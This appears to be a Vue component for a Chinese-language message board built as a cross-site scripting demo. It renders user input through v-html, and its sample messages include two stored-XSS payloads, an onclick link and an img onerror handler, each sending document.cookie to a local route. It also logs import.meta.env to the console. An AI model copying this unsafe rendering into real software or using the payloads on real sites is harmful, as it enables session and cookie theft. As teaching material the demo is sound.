<template>
  <main>
    <h1>
      留言板
    </h1>
    <ul class="message-list">
      <li class="message" v-for="(message, index) in messages" :key="index" v-html="message">
      </li>
    </ul>
    <hr class="my-6"/>
    <form class="form" @submit.prevent="onInputSubmit">
      <textarea rows="5" v-model="input" class="form-input" />
      <button class="form-button" type="submit">送出</button>
    </form>
  </main>
</template>

<script>
console.log(import.meta.env)
export default {
  data () {
    return {
      input: '',
      messages: [
        '搶頭香',
        '尬廣跟上',
        '只要你不尷尬，尷尬的就是別人',
        '很重要所以說三次！！',
        '不錯的文章<a href="#" onclick="window.open(`/#/cookie?cookie=${document.cookie}`, \'_blank\')">點我看更多</a>',
        '測試圖片error<img src="xxx.com" onerror="fetch(`/#/cookie?cookie=${document.cookie}`)"/>'
      ]
    }
  },
  methods: {
    onInputSubmit () {
      if (this.input) {
        this.messages.push(this.input)
        this.input = ''
      }
    }
  }
}
</script>
<style scoped>
  .my-6 {
    margin: 24px 0px 24px 0px;
  }
  .message-list {
    text-align: left;
    list-style: decimal;
  }
  .message {
    border: 1px solid grey;
    border-radius: 5px;
    padding: 12px;
    margin-bottom: 6px;
  }
  .form {
    display: flex;
    justify-content: center;
    gap: 12px;
    align-items: center;
  }
  .form-input {
    background-color: white;
    border-radius: 5px;
    border: none;
    width: 500px;
    color: black;;
  }
  .form-button {
    background-color: white;
    color: black;
    height: 48px;
    border: 1px solid black;
  }
</style>